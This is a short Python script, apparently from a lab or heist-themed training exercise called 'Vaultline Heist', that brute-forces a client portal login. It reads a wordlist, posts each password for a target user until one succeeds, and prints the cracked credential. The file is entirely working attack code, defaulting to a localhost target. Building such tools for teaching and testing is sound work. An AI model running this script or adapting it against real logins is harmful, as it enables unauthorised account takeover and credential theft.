"""
Vaultline Heist — password brute-forcer (Stage 1).

Reads a wordlist and tries each password against the client portal login until
one works. This is the kind of script an attacker (or a student, with a hand
from an AI) writes to crack a login.

Usage:
    python tools/brute_force.py <target_username>
    python tools/brute_force.py <target_username> http://127.0.0.1:8000 tools/wordlist.txt
"""

import sys
import requests

username = sys.argv[1] if len(sys.argv) > 1 else "w.brooks"
base = (sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:8000").rstrip("/")
wordlist = sys.argv[3] if len(sys.argv) > 3 else "tools/wordlist.txt"
url = f"{base}/portal/login/"

print(f"[*] Brute-forcing {username} at {url}")
print(f"[*] Wordlist: {wordlist}\n")

tries = 0
with open(wordlist, encoding="latin-1", errors="ignore") as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        tries += 1
        r = requests.post(url, json={"username": username, "password": password})
        if r.status_code == 200 and r.json().get("success"):
            print(f"\n[+] FOUND after {tries} tries -> {username} : {password}")
            sys.exit(0)
        if tries % 250 == 0:
            print(f"    ...{tries} tried (last: {password})")

print(f"\n[-] Not found in {tries} candidates. Wrong wordlist?")
